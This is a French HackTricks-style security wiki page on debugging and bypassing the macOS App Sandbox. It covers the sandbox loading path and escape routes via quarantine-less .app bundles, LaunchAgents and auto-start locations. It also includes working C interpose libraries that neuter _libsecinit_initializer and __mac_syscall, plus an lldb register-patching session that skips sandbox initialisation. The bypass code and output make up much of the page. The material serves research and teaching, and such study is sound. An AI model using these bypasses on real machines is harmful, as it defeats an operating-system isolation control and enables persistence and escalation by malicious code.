# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Processus de chargement du Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Image provenant de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Dans l'image précédente, il est possible d'observer **comment le sandbox sera chargé** lorsqu'une application avec le droit **`com.apple.security.app-sandbox`** est exécutée.

Le compilateur liera `/usr/lib/libSystem.B.dylib` au binaire.

Ensuite, **`libSystem.B`** appellera plusieurs autres fonctions jusqu'à ce que **`xpc_pipe_routine`** envoie les droits de l'application à **`securityd`**. Securityd vérifie si le processus doit être mis en quarantaine à l'intérieur du Sandbox, et si c'est le cas, il sera mis en quarantaine.\
Enfin, le sandbox sera activé par un appel à **`__sandbox_ms`** qui appellera **`__mac_syscall`**.

## Bypasses possibles

### Contourner l'attribut de quarantaine

**Les fichiers créés par des processus sandboxés** se voient ajouter l'**attribut de quarantaine** pour empêcher les échappées du sandbox. Cependant, si vous parvenez à **créer un dossier `.app` sans l'attribut de quarantaine** au sein d'une application sandboxée, vous pourriez faire pointer le binaire du bundle de l'application vers **`/bin/bash`** et ajouter certaines variables d'environnement dans le **plist** pour abuser de **`open`** afin de **lancer la nouvelle application sans sandbox**.

C'est ce qui a été fait dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Par conséquent, pour le moment, si vous êtes simplement capable de créer un dossier avec un nom se terminant par **`.app`** sans un attribut de quarantaine, vous pouvez échapper au sandbox car macOS ne **vérifie** que l'**attribut de quarantaine** dans le **dossier `.app`** et dans le **binaire principal** (et nous allons pointer le binaire principal vers **`/bin/bash`**).
>
> Notez que si un bundle .app a déjà été autorisé à s'exécuter (il a un xttr de quarantaine avec le drapeau autorisé à s'exécuter), vous pourriez également en abuser... sauf que maintenant vous ne pouvez pas écrire à l'intérieur des bundles **`.app`** à moins d'avoir des permissions TCC privilégiées (que vous n'aurez pas à l'intérieur d'un sandbox élevé).

### Abuser de la fonctionnalité Open

Dans les [**derniers exemples de contournement du sandbox Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), on peut apprécier comment la fonctionnalité cli **`open`** pourrait être abusée pour contourner le sandbox.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Agents/Daemons de lancement

Même si une application est **destinée à être sandboxée** (`com.apple.security.app-sandbox`), il est possible de contourner le sandbox si elle est **exécutée à partir d'un LaunchAgent** (`~/Library/LaunchAgents`) par exemple.\
Comme expliqué dans [**ce post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), si vous souhaitez obtenir une persistance avec une application qui est sandboxée, vous pourriez la faire exécuter automatiquement en tant que LaunchAgent et peut-être injecter du code malveillant via des variables d'environnement DyLib.

### Abuser des emplacements de démarrage automatique

Si un processus sandboxé peut **écrire** à un endroit où **plus tard une application non sandboxée va exécuter le binaire**, il pourra **s'échapper simplement en plaçant** le binaire là. Un bon exemple de ce type d'emplacements est `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Pour cela, vous pourriez même avoir besoin de **2 étapes** : Faire exécuter un processus avec un **sandbox plus permissif** (`file-read*`, `file-write*`) qui exécutera votre code et écrira effectivement à un endroit où il sera **exécuté sans sandbox**.

Consultez cette page sur les **emplacements de démarrage automatique** :

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abuser d'autres processus

Si à partir du processus sandboxé, vous parvenez à **compromettre d'autres processus** s'exécutant dans des sandboxes moins restrictives (ou aucune), vous pourrez échapper à leurs sandboxes :

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Compilation statique et liaison dynamique

[**Cette recherche**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) a découvert 2 façons de contourner le Sandbox. Parce que le sandbox est appliqué depuis l'espace utilisateur lorsque la bibliothèque **libSystem** est chargée. Si un binaire pouvait éviter de la charger, il ne serait jamais sandboxé :

- Si le binaire était **complètement compilé statiquement**, il pourrait éviter de charger cette bibliothèque.
- Si le **binaire n'avait pas besoin de charger de bibliothèques** (car le linker est également dans libSystem), il n'aurait pas besoin de charger libSystem.

### Shellcodes

Notez que **même les shellcodes** en ARM64 doivent être liés dans `libSystem.dylib` :
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Entitlements

Notez que même si certaines **actions** peuvent être **autorisées par le sandbox** si une application a un **droit** spécifique, comme dans :
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Contournement d'Interposting

Pour plus d'informations sur **Interposting**, consultez :

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` pour empêcher le sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interposer `__mac_syscall` pour empêcher le Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Déboguer et contourner le Sandbox avec lldb

Commençons par compiler une application qui devrait être sandboxée :

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Ensuite, compilez l'application :
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> L'application essaiera de **lire** le fichier **`~/Desktop/del.txt`**, ce que le **Sandbox ne permettra pas**.\
> Créez un fichier là-dedans car une fois le Sandbox contourné, il pourra le lire :
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Déboguons l'application pour voir quand le Sandbox est chargé :
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Même avec le Sandbox contourné, TCC** demandera à l'utilisateur s'il souhaite autoriser le processus à lire des fichiers du bureau

## Références

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
